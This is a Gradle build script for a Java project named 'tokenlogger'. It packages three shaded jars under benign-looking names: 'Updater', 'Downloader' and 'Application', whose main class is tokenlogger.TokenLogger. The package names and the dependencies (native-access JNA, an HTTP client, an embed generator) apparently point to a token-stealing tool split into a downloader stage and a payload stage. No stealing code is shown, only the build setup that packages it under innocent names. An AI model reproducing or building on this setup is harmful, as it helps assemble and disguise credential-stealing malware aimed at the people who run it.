import com.github.jengelman.gradle.plugins.shadow.tasks.ShadowJar

plugins {
    id 'java'
        id 'com.github.johnrengelman.shadow' version '8.1.1'
}

repositories {
    mavenCentral()
}

sourceSets {
    main {
        java {
            srcDirs += ['src/main/java/']
        }
    }
}

dependencies {
    implementation 'com.fasterxml.jackson.core:jackson-databind:2.15.2'
    implementation 'net.java.dev.jna:jna-platform:5.13.0'
    implementation 'com.squareup.okhttp3:okhttp:5.0.0-alpha.11'
}

task updaterJar (type: ShadowJar) {
    archiveBaseName.set 'Updater'
    archiveVersion.set ''
    archiveClassifier.set ''
    dependsOn compileJava
    from sourceSets.main.output
    exclude '**/tokenlogger/TokenLogger.class'
    exclude '**/downloader'
    exclude '**/tokenlogger/utils/EmbedGenerator.class'
    exclude '**/tokenlogger/utils/Json.class'
    exclude '**/tokenlogger/utils/PathHelper.class'
    project.configurations.implementation.canBeResolved = true
    configurations = [project.configurations.implementation]
    dependencies {
        exclude '/com/sun/jna/'
    }
    manifest {
        attributes 'Main-Class' : 'tokenlogger.updater.Updater'
    }
}

task downloaderJar (type: ShadowJar) {
    archiveBaseName.set 'Downloader'
    archiveVersion.set ''
    archiveClassifier.set ''
    dependsOn compileJava
    from sourceSets.main.output
    exclude '**/tokenlogger/'
    exclude '**/EmbedTemplate.json'
    project.configurations.implementation.canBeResolved = true
    configurations = [project.configurations.implementation]
    dependencies {
        exclude '/com/'
        exclude '/kotlin/'
        exclude '/okhttp3/'
        exclude '/okio/'
        exclude '/org/'
    }
    manifest {
        attributes 'Main-Class' : 'downloader.Downloader'
    }
}

task applicationJar (type: ShadowJar) {
    archiveBaseName.set 'Application'
    archiveVersion.set ''
    archiveClassifier.set ''
    dependsOn compileJava
    from sourceSets.main.output
    exclude '**/downloader'
    exclude '**/tokenlogger/updater'
    project.configurations.implementation.canBeResolved = true
    configurations = [project.configurations.implementation]
    manifest {
        attributes 'Main-Class' : 'tokenlogger.TokenLogger'
    }
}
